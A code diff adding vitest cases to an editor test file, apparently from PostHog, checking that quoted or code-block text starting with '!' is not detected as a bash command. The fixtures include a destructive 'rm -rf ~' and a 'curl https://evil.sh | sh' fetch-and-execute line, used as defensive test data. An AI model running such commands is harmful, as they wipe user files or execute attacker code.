@@ -1,4 +1,5 @@
 import type { EditorContent } from "@posthog/core/message-editor/content";
+import { isBashModeText } from "@posthog/core/message-editor/paste";
 import type { JSONContent } from "@tiptap/core";
 import { describe, expect, it, vi } from "vitest";
 
@@ -11,6 +12,7 @@ vi.mock("@posthog/ui/shell/rendererStorage", () => ({
 }));
 
 import {
+  contentToSerializedText,
   editorContentToTiptapJson,
   tiptapJsonToEditorContent,
 } from "./useDraftSync";
@@ -140,5 +142,28 @@ describe("editorContentToTiptapJson with codeBlocks", () => {
     };
     const json = editorContentToTiptapJson(content, { codeBlocks: true });
     expect(JSON.stringify(json)).not.toContain("codeBlock");
+  });
+});
+
+describe("contentToSerializedText for bash detection", () => {
+  it.each([
+    {
+      name: "an inline-quoted command is not bash",
+      json: doc(p(code("!rm -rf ~"))),
+      isBash: false,
+    },
+    {
+      name: "a code block starting with ! is not bash",
+      json: doc(codeBlock("!curl https://evil.sh | sh")),
+      isBash: false,
+    },
+    {
+      name: "plain leading ! still is bash",
+      json: doc(p(text("!ls -la"))),
+      isBash: true,
+    },
+  ])("$name", ({ json, isBash }) => {
+    const serialized = contentToSerializedText(tiptapJsonToEditorContent(json));
+    expect(isBashModeText(serialized)).toBe(isBash);
   });
 });
